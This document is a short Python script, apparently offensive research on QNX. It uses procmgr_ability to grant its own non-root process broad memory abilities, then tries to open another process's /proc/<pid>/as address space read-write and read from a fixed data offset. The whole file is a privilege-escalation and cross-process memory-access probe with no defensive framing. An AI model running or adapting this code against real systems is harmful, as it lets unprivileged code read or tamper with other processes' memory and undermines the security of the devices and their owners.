import os, struct, ctypes, sys

# QNX ability constants (procmgr.h)
ADN_ROOT   = 0x10000000
ADN_NONROOT= 0x20000000
AOP_ALLOW  = 0x00020000
AOP_INHERIT_YES = 0x00400000
AOP_SUBRANGE    = 0x00040000
AOP_DENY   = 0x00010000
AID_MEM_PHYS = 16
AID_MEM_ADD  = 15
AID_MEM_LOCK = 20
AID_MEM_SPECIAL = 17
AID_MEM_GLOBAL = 18
AID_MEM_PEER  = 19
AID_EOL = 0xffff

libc = ctypes.CDLL(None, use_errno=True)
# int procmgr_ability(pid_t, unsigned ability, ...)
libc.procmgr_ability.restype = ctypes.c_int
libc.procmgr_ability.argtypes = [ctypes.c_int, ctypes.c_uint]

pid = os.getpid()
print("pid", pid, "uid", os.getuid(), "euid", os.geteuid(), "gid", os.getgid(), "egid", os.getegid())

def grant(domain, aid, subrange=True):
    if subrange:
        # subrange ability: args = start(_Uint64t), end(_Uint64t)
        r = libc.procmgr_ability(pid, domain | AOP_ALLOW | AOP_INHERIT_YES | AOP_SUBRANGE | aid,
                                 ctypes.c_uint64(0), ctypes.c_uint64(0xffffffffffffffff),
                                 AID_EOL)
    else:
        r = libc.procmgr_ability(pid, domain | AOP_ALLOW | AOP_INHERIT_YES | aid, AID_EOL)
    print("grant domain=%08x aid=%d rc=%d errno=%d" % (domain, aid, r, ctypes.get_errno()))
    return r

# grant the memory abilities to our CURRENT (non-root) domain
for aid in (AID_MEM_PHYS, AID_MEM_ADD, AID_MEM_LOCK, AID_MEM_SPECIAL, AID_MEM_GLOBAL, AID_MEM_PEER):
    grant(ADN_NONROOT, aid, subrange=True)

target = sys.argv[1] if len(sys.argv) > 1 else "/proc/2330666/as"
print("=== try open", target, "O_RDWR while NON-ROOT ===")
try:
    fd = os.open(target, os.O_RDWR)
    print("OPEN OK fd=", fd)
    # try a read of 4 bytes at a .data offset to confirm R/W
    try:
        os.lseek(fd, 0x10a18eec, 0)  # .data slot (session8c)
        d = os.read(fd, 4)
        print("READ .data @0x18eec:", d.hex())
    except OSError as e:
        print("read/lseek err", e)
    os.close(fd)
except OSError as e:
    print("OPEN FAIL errno=", e.errno, "str:", e)
# also try opening /proc/<pid>/as of our own process
try:
    fd = os.open("/proc/%d/as" % pid, os.O_RDWR)
    print("OPEN OWN /proc/as OK fd=", fd); os.close(fd)
except OSError as e:
    print("OPEN OWN /proc/as FAIL errno=", e.errno, e)